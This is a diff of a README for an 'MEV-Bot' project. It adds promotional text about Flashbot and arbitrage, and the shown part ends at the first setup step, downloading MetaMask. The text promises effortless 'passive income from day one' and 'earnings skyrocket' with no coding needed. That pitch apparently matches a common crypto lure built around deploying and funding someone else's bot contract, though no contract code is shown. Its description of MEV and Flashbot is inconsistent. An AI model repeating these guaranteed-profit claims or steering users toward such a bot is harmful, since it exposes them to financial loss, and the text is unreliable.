@@ -1,14 +1,20 @@
-Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots sniping profits across exchange’s pools.
+# MEV-Bot
 
+### Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure of Flashbot, you can earn passive income by exploiting MEV.
+
+Flashbot provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
+Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots sniping profits across exchange’s pools.
 You are now able to take advantage of those arbitrages yourself, a benefit that was previously only available to highly skilled devs. Here I provide you the access to my user-friendly (no coding skills required) MEV bot. Enjoy stress-free passive income from day one.
 
-My flagship project that I recently released is Arbitrage MEV bot which runs on ETH pairs on Uniswap making profits from arbitrage trades.
+## 💡 Introducing Flashbot
+Flashbot is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-Using my smart contract source code allows users to create their own MEV bots which stacks up the profits from automatic trades for the users.
+Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
-I share my Arbitrage MEV bot smart contract for free, but there’s 0.1% fee charged from users’ profits, which goes back to me.
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-How to launch your own arbitrage bot
+## How to launch your own arbitrage bot
+
 
 Download MetaMask (if you don’t have it already):
 https://metamask.io/download.html
